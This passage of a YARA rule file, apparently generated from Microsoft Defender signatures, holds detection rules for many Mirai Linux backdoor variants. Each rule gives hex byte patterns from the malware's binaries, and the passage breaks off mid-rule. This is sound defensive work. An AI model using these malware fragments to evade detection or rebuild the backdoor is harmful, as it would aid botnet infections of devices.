        $x_1_2 = {e2 d8 e3 9f 7b 46 37 0c f5 ab 00 dd ac 82 62 5b 21 16 e3 85 a9 96 7c 34 00 d9 ac 96 70 5b 34 17 f9 d8 a5 db 6a 1a 32 01 fe ab 00 c8 a5 86 7c 51 25 1d f1 d9 a8 c1 7b 5a 32 01 90 00 cd a2 9d 76 47 24 1f f1 d2 e3 86 7c 50 2f 78 00 c7 a4 8c 79}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_IU_2147912329_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.IU!MTB"
        threat_id = "2147912329"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {30 d0 8d e2 f0 8f bd e8 0a 00 0a 00 34 2e 30 30 32 30 32 31 0a 00 00 00 14 30 8d e5 04 60 8e e2 00 50 a0 e3 00 40 e0 e3 03 20 a0 e3 00 10 96 e5 00 00 a0 e3 0c 10 8d e5 c0 70 a0 e3 00 00 00 ef 08 00 8d e5 00 30 96 e5 04 30 2d e5 0d 30 a0 e1 00 20 a0 e1 08 00 d6 e5}  //weight: 1, accuracy: High
        $x_1_2 = {18 d0 4d e2 b0 02 00 eb 00 c0 dd e5 0e 00 5c e3 78 ?? ?? ?? 0c 48 2d e9 00 b0 d0 e5 06 cc a0 e3 ab b1 a0 e1 1c cb a0 e1 0d b0 a0 e1 3a cd 8c e2 0c d0 4d e0 00 c0 93 e5 08 30 8d e5 04 c0 8d e5 00 20 8d e5 0c 30 8d e2 00 c0 a0 e3}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_IX_2147913316_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.IX!MTB"
        threat_id = "2147913316"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {00 05 ca 7f 16 9c 11 f9 89 00 00 00 00 02 9d 74 8b 45 aa 7b ef b9 9e fe ad 08 19 ba cf 41 e0 16 a2 32 6c f3 cf f4 8e 3c 44 83 c8 8d 51 45 6f 90 95 23 3e 00 97 2b 1c 71 b2 4e c0 61 f1 d7 6f c5 7e f6 48 52 bf 82 6a a2 3b 65 aa 18 7a 17 38 c3 81 27 c3 47 fc a7 35 ba fc 0f 9d 9d 72 24 9d fc 02 17 6d 6b b1 2d 72 c6 e3 17 1c 95 d9 69 99 57 ce dd df 05 dc 03 94 56 04 3a 14 e5 ad 9a 2b 14 30 3a 23 a3 25 ad e8 e6 39 8a 85 2a c6 df e5 5d 2d a0 2f 5d 9c d7 2b 24 fb b0 9c c2 ba 89 b4 1b 17 a2}  //weight: 1, accuracy: High
        $x_1_2 = {00 6b 22 03 38 5a 35 5a 7d 5e 24 18 29 05 29 14 30 46 6d 01 2d 5a 2d 09 3e 4b 35 09 32 44 6e 18 35 5e 2c 0c 76 52 2c 0c 71 4b 31 10 31 43 22 01 29 43 2e 0e 72 52 2c 0c 66 5b 7c 50 73 13 6d 09 30 4b 26 05 72 4b 37 09 3b 06 28 0d 3c 4d 24 4f 2a 4f 23 10 71 43 2c 01 3a 4f 6e 01 2d 44 26 4c 77 05 6b 5b 2c 17 71 4e 65 06 20 10 2d 46 28 03 3c 5e 28 0f 33 05 32 09 3a 44 24 04 70 4f 39 03 35 4b 2f 07 38 11 37 5d 3f 19 7a 11 60 1a 6f 57 00 6b 22 03 38 5a 35 4d 18 44 22 0f 39 43 2f 07 67 0a 26 1a 34 5a 6d 40 39 4f 27 0c 3c 5e}  //weight: 1, accuracy: High
        $x_2_3 = "example.ulfheim.net" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_2_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule Backdoor_Linux_Mirai_JF_2147913317_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.JF!MTB"
        threat_id = "2147913317"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {b8 2b 63 64 1f 8d a3 65 25 d2 b3 64 0b 42 b3 63 a7 00 1a 01 0b 42 18 33 e1 51 03 6b 20 d0 63 64 17 03 0b 40 1a 02 a7 00 03 67 1a 01 d7 03 1c d3 18 36 6c 32 23 64 0b 43 1a 06 a7 00 7c 36 0c 36 1a 01 0c a0 18 32}  //weight: 1, accuracy: High
        $x_1_2 = {0c 91 10 34 00 8b 5f 65 53 61 00 41 1a 31 53 60 e3 6f f6 6e 0b 00}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_EX_2147913421_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.EX!MTB"
        threat_id = "2147913421"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {04 00 42 92 00 00 43 8e 05 00 52 26 14 00 a2 a0 04 00 a3 ac 10 00 a3 ac 00 00 a6 a4 f8 ff 92 14 18 00 a5 24 21 10 d7 02 23 10 22 02 fa ff 54 24}  //weight: 1, accuracy: High
        $x_1_2 = {21 10 43 02 00 00 42 80 00 00 00 00 ec ff 40 10 00 00 00 00 ?? ?? ?? ?? 01 00 63 24 ff ff 63 24 03 00 71 24 02 00 66 24 21 10 a6 02 20 00 43 80 00 00 00 00 c8 01 60 10 20 00 02 24 c5 01 62 10 01 00 c2 24 21 10 42 02 21 20 c0 00 03 00 00 10 20 00 05 24}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_FQ_2147913422_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.FQ!MTB"
        threat_id = "2147913422"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {21 20 83 00 14 00 84 90 02 1e 10 00 02 2a 05 00 00 32 06 00 00 86 10 00 25 18 65 00 25 80 06 02 06 10 82 00 25 18 70 00 21 18 62 00 24 38 67 00 00 ff 64 30 02 16 03 00 02 3a 07 00}  //weight: 1, accuracy: High
        $x_1_2 = {00 86 10 00 25 18 65 00 25 80 06 02 06 10 82 00 25 18 70 00 21 18 62 00 24 38 67 00 00 ff 64 30 02 16 03 00 02 3a 07 00 00 22 04 00 00 1e 03 00 25 10 47 00 25 18 64 00 25 10 43 00}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_FZ_2147913423_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.FZ!MTB"
        threat_id = "2147913423"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {00 80 60 21 24 02 00 05 3c 03 de ec ac a2 00 10 24 02 00 0b 34 63 e6 6d a4 a2 00 0c 24 02 00 01 ac a3 00 14 a4 a2 00 0e 95 83 00 04 95 86 00 02 95 85 00 00 00 60 10 21 00 06 34 00 00 00 18 21 8d 2a 00 10 00 65 18 25 00 c0 38 21}  //weight: 1, accuracy: High
        $x_1_2 = {80 85 00 00 00 00 00 00 24 a2 ff d0 30 42 00 ff 2c 42 00 0a 10 40 00 0f 00 00 18 21 00 03 10 c0 00 03 18 40 00 62 18 21 24 84 00 01 00 65 18 21 80 85 00 00 00 00 00 00 24 a2 ff d0 30 42 00 ff 2c 42 00 0a 14 40 ff f5 24 63 ff d0 03 e0 00 08 00 60 10 21}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_GK_2147913424_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.GK!MTB"
        threat_id = "2147913424"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {09 f8 20 03 00 00 00 00 10 00 bc 8f 21 88 40 00 34 83 99 8f 21 20 00 02 05 00 40 14 23 38 50 00 09 f8 20 03 00 00 00 00 10 00 bc 8f 21 38 40 00 23 10 92 02 01 00 43 26 ff ff 42 24 21 40 72 02 21 28 00 02}  //weight: 1, accuracy: High
        $x_1_2 = {0d 00 c5 10 00 00 00 00 00 00 c2 90 00 00 a3 90 40 10 02 00 40 18 03 00 21 10 47 00 21 18 67 00 00 00 44 84 00 00 62 84 00 00 00 00 23 20 82 00 05 00 80 14 00 00 00 00 00 00 c2 80 01 00 a5 24 ef ff 40 14 01 00 c6 24 08 00 e0 03 21 10 80 00}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_GM_2147913425_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.GM!MTB"
        threat_id = "2147913425"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {14 00 67 20 b6 28 00 04 67 18 43 e8 00 06 42 81 52 81 b2 82 67 0e 20 49 10 29 00 04 5c 89 b6 00 66 ee 28 10 20 44 20 08 4c df 00 1c 4e 75}  //weight: 1, accuracy: High
        $x_1_2 = {d1 ef 00 30 20 03 d0 8a 20 92 11 6a 00 04 00 04 5a 8a 5b 82 31 7c 00 02 ff f0 21 50 ff f4 41 e8 00 16 b0 8a 66 e2 4a 82 66 46 99 cc 4a af 00 30}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_GL_2147913426_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.GL!MTB"
        threat_id = "2147913426"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {00 00 00 00 00 00 00 00 01 06 00 18 00 00 18 12 00 6a 18 21 00 00 00 00 00 e8 00 19 00 00 48 12 01 25 58 21 01 69 20 2b 00 00 40 10 00 68 18 21 00 83 20 21 00 04 1c 00 00 0b 2c 02 00 65 28 25 a5 84 00 04 a5 85 00 02 03 e0 00 08 a5 8b 00 00}  //weight: 1, accuracy: High
        $x_1_2 = {26 10 00 20 26 31 ff e0 16 ?? ?? ?? 24 02 00 01 12 62 ff bd 00 00 98 21 8f ?? ?? ?? 00 00 00 00 03 20 f8 09 02 40 20 21 8f bc 00 10 00 00 10 21 8f bf 10 54 8f b4 10 50 8f b3 10 4c 8f b2 10 48 8f b1 10 44}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_GS_2147913427_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.GS!MTB"
        threat_id = "2147913427"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {00 95 04 20 80 0f 00 00 00 60 45 20 00 0c 00 b5 94 ?? 0f 85 42 20 40 00 0f a5 ?? ?? f0 a5 40 25 00 1e 2f 27 0c 10 15 0f 92 10 8a 20 81 18 81 d9 01 da 00 db 6f 22 3f 00}  //weight: 1, accuracy: Low
        $x_1_2 = {0b 20 00 a4 ae 01 04 00 04 26 80 1f 00 00 03 80 01 68 21 6f 04 79 99 09 21 80 04 1d 00 14 06 26 c0 73 00 00 00 04 cb 78 ?? ?? 04 27 8f 1f 00 00 00 80 e5 7e 44 26 c0 10 20 95 01 68 47 20 c0 00 14 68 04 21 81 0f 00 00 00 20 04 26 8e 1f ff ff 00 84}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_HI_2147913428_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.HI!MTB"
        threat_id = "2147913428"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {00 80 28 21 03 20 30 21 00 a0 20 21 24 02 0f cd 00 00 00 0c 8f 83 81 a8 00 45 28 2b 00 00 20 21 10 a0 00 08 ac 62 00 00 00 c0 c8 21 03 20 f8 09 00 00 00 00 24 03 00 0c 8f bc 00 10 24 04 ff ff ac 43 00 00 8f bf 00 18 00 80 10 21 03 e0 00 08 27 bd 00 20}  //weight: 1, accuracy: High
        $x_1_2 = {24 e8 ff d0 29 02 01 00 10 40 00 24 24 84 00 01 80 86 00 00 00 08 18 c0 00 08 10 40 00 43 10 21 00 06 18 40 00 69 18 21 94 63 00 00 00 46 38 21 30 62 00 08 14 40 ff f2 29 42 00 04 10 40 00 05 00 00 00 00 14 cc 00 15 24 84 00 01 10 00 00 07 00 0b 12 00}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_HL_2147913429_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.HL!MTB"
        threat_id = "2147913429"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {10 40 2d e9 ff 00 00 e2 03 40 a0 e1 ff 20 02 e2 00 c0 a0 e3 04 00 00 ea 04 30 d1 e5 02 00 53 e1 08 10 81 e2 00 40 9e 05 03 00 00 0a 00 00 5c e1 01 e0 a0 e1 01 c0 8c e2 f6 ff ff ba 04 00 a0 e1 10 80 bd e8}  //weight: 1, accuracy: High
        $x_1_2 = {00 c0 a0 e3 04 00 00 ea 00 30 d0 e5 01 20 d0 e5 02 34 83 e1 03 c0 8c e0 02 00 80 e2 01 00 51 e3 02 10 41 e2 f7 ff ff 8a 00 30 d0 05 03 c0 8c 00 0c 08 a0 e1 20 08 a0 e1 2c 08 80 e0 20 08 80 e0 00 00 e0 e1 00 08 a0 e1 20 08 a0 e1}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_EP_2147913525_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.EP!MTB"
        threat_id = "2147913525"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {41 8b 14 24 89 51 10 41 0f b6 44 24 04 49 83 c4 05 66 c7 01 02 00 89 51 04 88 41 14 48 83 c1 18 4c 39 e6 75 db ?? ?? ?? 29 c3}  //weight: 1, accuracy: Low
        $x_1_2 = {48 83 7c 24 18 00 0f 84 e6 fd ff ff 44 0f b6 64 24 17 45 85 e4 7e 1f 48 8b 5c 24 18 31 ed}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_FO_2147913526_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.FO!MTB"
        threat_id = "2147913526"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3c 30 97 e5 07 00 53 e3 3c 50 94 c5 1f ?? ?? ?? 04 00 a0 e1 cd ?? ?? ?? 00 20 a0 e3 00 00 5a e3 00 20 c6 e5 b2 ?? ?? ?? 44 30 d7 e5 02 00 53 e1 b1 ?? ?? ?? 05 30 dd e5 2d 00 53 e3 02 10 a0 01 02 ?? ?? ?? 05 00 5b e3 00 10 a0 c3}  //weight: 1, accuracy: Low
        $x_1_2 = {00 00 59 e3 00 00 89 15 00 00 5a e3 02 71 e0 03 02 71 a0 13 00 60 e0 03 00 60 a0 13 00 30 5b e2 01 30 a0 13 07 00 55 e1 00 20 a0 e3}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_JA_2147913527_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.JA!MTB"
        threat_id = "2147913527"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {7c 1d 58 50 7c 7f ea 14 60 00 00 01 63 a9 00 01 90 03 00 04 38 63 00 08 7d 3f e9 2e 91 3f 00 04 7c 1f 59 2e}  //weight: 1, accuracy: High
        $x_1_2 = {81 5e 00 0c 7d 3e 8a 14 80 1e 00 08 7f df f3 78 91 09 00 04 90 09 00 08 62 20 00 01 91 2a 00 08 91 49 00 0c 81 69 00 08 7c 1e 89 2e 90 1e 00 04 91 2b 00 0c 7d 07 f1 2e}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_JC_2147913528_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.JC!MTB"
        threat_id = "2147913528"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {0c 26 80 80 40 2c 84 10 ca 22 8e 01 52 27 7e 80 60 81 ca 24 82 10 4a ?? 82 25 20 00 68 74 d8 72}  //weight: 1, accuracy: Low
        $x_1_2 = {00 17 89 00 04 21 8b 1f 00 00 c0 00 52 23 fe 91 e8 ?? 96 6c 44 21 c9 1f 42 23 43 00 40 2e 46 01 21 74 40 27 47 00 40 2e 49 00 06 24 4c 12}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_JG_2147913529_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.JG!MTB"
        threat_id = "2147913529"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {40 29 03 02 c7 b9 cf bb 65 79 40 29 05 04 88 70 05 25 45 00 02 7a 59 60 25 ?? ?? ?? 59 60 b6 ?? e0 7f 00 d8 ff 14 83 80}  //weight: 1, accuracy: Low
        $x_1_2 = {fc 10 01 80 42 20 03 01 07 21 41 01 00 21 84 0f fe 7e ff fe 07 21 01 01 06 26 41 70 01 81 00 01 16 ?? 23 8b 0b ?? ?? ?? e0 7f 42 20 40 00}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_JH_2147913530_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.JH!MTB"
        threat_id = "2147913530"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {93 60 1d 40 c1 d1 23 63 1c 01 1c 61 18 33 38 23 09 ?? 33 61 e0 71 b3 62 1d 42 c3 61 3d 41 23 6c 3d 49 1b 2c 3d 4b}  //weight: 1, accuracy: Low
        $x_1_2 = {ff e0 8c 52 19 23 8b 51 38 23 2c 31 29 00 11 18 ff 70 12 18 26 4f}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_HS_2147913532_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.HS!MTB"
        threat_id = "2147913532"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {90 0a 20 ff 94 0a a0 ff 10 80 00 09 84 10 20 00 84 00 a0 01 80 a0 40 0a 82 10 00 09 12 80 00 04 92 02 60 08 10 80 00 05 d6 00 40 00 80 a0 80 08 26 bf ff f8 c2 0a 60 04}  //weight: 1, accuracy: High
        $x_1_2 = {82 08 40 03 84 00 80 04 82 06 80 01 82 00 40 1c 10 80 00 03 82 00 40 02 82 00 c0 02 85 30 60 10 80 a0 a0 00 12 bf ff fd 86 08 40 1b b0 38 00 01 b1 2e 20 10 b1 36 20 10 81 c7 e0 08 81 e8 00 00}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_HW_2147913533_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.HW!MTB"
        threat_id = "2147913533"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {0d 00 00 da 04 30 d1 e5 02 00 53 e1 08 c0 81 12 00 e0 a0 13 04 00 00 1a 09 00 00 ea 04 30 dc e5 02 00 53 e1 08 c0 8c e2 05 00 00 0a 01 e0 8e e2 00 00 5e e1 0c 10 a0 e1 f7 ff ff 1a 04 00 a0 e1 10 80 bd e8 00 40 91 e5 04 00 a0 e1 10 80 bd e8}  //weight: 1, accuracy: High
        $x_1_2 = {0e 00 00 da 5c 30 9f e5 00 20 93 e5 00 c0 92 e5 04 30 dc e5 07 00 53 e1 05 00 a0 11 04 00 00 1a 08 00 00 ea 00 c1 92 e7 04 30 dc e5 07 00 53 e1 04 00 00 0a 01 00 80 e2 01 00 50 e1 f8 ff ff 1a 00 00 a0 e3 51 ff ff eb}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_IE_2147913534_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.IE!MTB"
        threat_id = "2147913534"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {c2 04 40 13 85 30 60 05 85 28 a0 02 84 00 80 19 c4 00 bf 58 85 38 80 01 80 88 a0 01 22 80 00 06 a4 04 a0 01 84 04 c0 11 82 10 20 01 c2 28 a0 04 a4 04 a0 01 a2 04 62 9c 80 a4 80 15 26 bf ff ca d0 04 40 13}  //weight: 1, accuracy: High
        $x_1_2 = {9a 06 00 11 c4 06 00 00 c4 20 ff f8 c2 0e 20 04 c2 28 ff fc 82 04 80 04 b2 06 7f fb c4 20 60 04 b0 06 20 05 82 10 20 02 c2 31 00 12 88 01 20 18 86 00 e0 18 80 a6 00 0d 12 bf ff f3 ba 10 00 08 80 a6 60 00 02 80 00 33 aa 10 20 00 c2 4b 00 11 80 a0 60 00}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_IP_2147913535_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.IP!MTB"
        threat_id = "2147913535"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {89 c2 83 ee 04 c1 e2 0b 31 c2 44 89 c0 c1 e8 13 89 d1 44 31 c0 c1 e9 08 31 c2 31 d1 89 0f 48 83 c7 04 85 f6 7e 3b 44 89 c8 45 89 d1 45 89 c2 41 89 c8 83 fe 03 7f c9 83 fe 01 74 42}  //weight: 1, accuracy: High
        $x_1_2 = {80 f9 d4 0f 94 c0 84 44 24 18 74 16 40 80 ff df 0f 97 c2 40 80 ff ff 0f 95 c0 84 d0 0f 85 3d ed ff ff 80 f9 59 0f 94 c0 84 44 24 33 74 16 40 80 ff 5f 0f 97 c2 40 80 ff 60 0f 96 c0 84 d0 0f 85 1b ed ff ff}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_FE_2147913993_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.FE!MTB"
        threat_id = "2147913993"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {30 84 00 ff 18 ?? ?? ?? 30 c6 00 ff ?? a2 00 04 00 00 00 00 10 ?? ?? ?? 24 a3 00 08 10 ?? ?? ?? 00 00 40 21 ?? 62 00 04 00 00 00 00 10 ?? ?? ?? 24 63 00 08}  //weight: 1, accuracy: Low
        $x_1_2 = {00 04 18 c0 00 04 11 40 00 43 10 23 00 5e 28 21 8f a2 00 68 00 04 18 80 00 62 18 21 ?? a2 00 14 8c 71 00 00 2c 42 00 20 14 40 00 47 26 32 00 14 8f a3 00 28 24 02 ff ff}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_HP_2147914065_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.HP!MTB"
        threat_id = "2147914065"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {f6 83 84 00 00 00 04 0f 44 c2 89 84 24 a0 00 00 00 31 d2 85 f6 74 04 8d 54 24 0c 31 c0 85 db 74 07 8d 84 24 98 00 00 00 6a 08 52 50 ff b4 24 3c 01 00 00 e8 99 00 00 00 83 c4 10 85 f6 89 c3}  //weight: 1, accuracy: High
        $x_1_2 = {8b 73 08 75 17 69 06 6d 4e c6 41 05 39 30 00 00 25 ff ff ff 7f 89 06 89 45 00 eb 2b 8b 4b 04 8b 13 8b 7b 18 8b 01 01 02 8b 02 83 c2 04 d1 e8 39 fa 89 45 00 8d 41 04 72 04}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_IW_2147914067_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.IW!MTB"
        threat_id = "2147914067"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
